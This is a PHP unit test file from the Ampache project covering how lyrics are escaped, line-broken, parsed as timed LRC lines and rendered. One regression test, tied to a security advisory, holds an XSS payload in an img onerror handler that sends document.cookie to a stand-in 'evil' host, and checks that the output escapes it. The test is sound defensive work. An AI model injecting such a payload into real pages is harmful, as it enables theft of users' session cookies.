<?php

declare(strict_types=1);

/**
 * vim:set softtabstop=4 shiftwidth=4 expandtab:
 *
 * LICENSE: GNU Affero General Public License, version 3 (AGPL-3.0-or-later)
 * Copyright Ampache.org, 2001-2026
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */

namespace Ampache\Gui\Song;

use Ampache\MockeryTestCase;

class LyricsLinesViewTest extends MockeryTestCase
{
    public function testGetLyricsConvertsNewlinesToBreaks(): void
    {
        $subject = new LyricsLinesView(1, "Line one\nLine two");

        $this->assertSame("Line one<br />\nLine two", $subject->getLyrics());
    }

    /**
     * A hostile ID3 USLT/LYRICS frame (GHSA-jp97-cx77-834v) must never reach the page unescaped.
     */
    public function testGetLyricsEscapesHostileMarkup(): void
    {
        $payload = '<img src=x onerror=fetch("//evil/"+document.cookie)>';

        $subject = new LyricsLinesView(1, $payload);

        $result = $subject->getLyrics();

        $this->assertStringNotContainsString('<img', $result);
        $this->assertStringContainsString('&lt;img', $result);
    }

    /**
     * Lyrics fetched by a provider before this fix were pre-formatted with a real <br>; it must still line-break
     * rather than being shown as literal, escaped tag text now that escaping applies to the whole value.
     */
    public function testGetLyricsNormalizesLegacyStoredBreaks(): void
    {
        $subject = new LyricsLinesView(1, 'Line one<br />Line two');

        $this->assertSame("Line one<br />\nLine two", $subject->getLyrics());
    }

    public function testGetLyricsReturnsPlaceholderWhenEmpty(): void
    {
        $subject = new LyricsLinesView(1, '');

        $this->assertSame('No lyrics found.', $subject->getLyrics());
    }

    /**
     * A stored <br /> followed by its own CRLF is one line break, not a blank line between every lyric line.
     */
    public function testGetLyricsTreatsABreakAndItsLineEndingAsOneBreak(): void
    {
        $subject = new LyricsLinesView(1, "[Drop]<br />\r\nLine one<br />\r\n<br />\r\nLine two");

        $this->assertSame("[Drop]<br />\nLine one<br />\n<br />\nLine two", $subject->getLyrics());
        $this->assertSame("[Drop]\nLine one\n\nLine two", LyricsLinesView::toPlainText("[Drop]<br />\r\nLine one<br />\r\n<br />\r\nLine two"));
    }

    public function testGetSyncedLinesIsEmptyForPlainLyrics(): void
    {
        $subject = new LyricsLinesView(1, "Line one\nLine two");

        $this->assertSame([], $subject->getSyncedLines());
    }

    public function testGetSyncedLinesSortsTimedLinesAndDropsLrcIdTags(): void
    {
        $subject = new LyricsLinesView(1, "[ar:Some Artist]\n[00:12.50]Second\n[00:01.00]First & <b>bold</b>");

        $this->assertSame(
            [
                ['start' => 1000, 'end' => null, 'value' => 'First & <b>bold</b>'],
                ['start' => 12500, 'end' => null, 'value' => 'Second'],
            ],
            $subject->getSyncedLines()
        );
    }

    public function testRenderHandsTheOffsetAndStatedEndsToThePlayer(): void
    {
        $html = new LyricsLinesView(42, "[offset:-200]\n[00:01.00]<00:01.00>Hi <00:02.50>\n[00:03.00]Plain")->render();

        $this->assertStringContainsString('data-offset="-200"', $html);
        $this->assertStringContainsString('<p data-start="1000" data-end="2500">Hi </p>', $html);
        $this->assertStringContainsString('<p data-start="3000">Plain</p>', $html);
    }

    public function testRenderMarksEachTimedLineWithItsStartForThePlayer(): void
    {
        $html = new LyricsLinesView(42, "[00:01.50]Rock & <roll>")->render();

        $this->assertStringContainsString('class="lyrics_lines lyrics_synced" data-song-id="42"', $html);
        $this->assertStringContainsString('<p data-start="1500">Rock &amp; &lt;roll&gt;</p>', $html);
    }
}
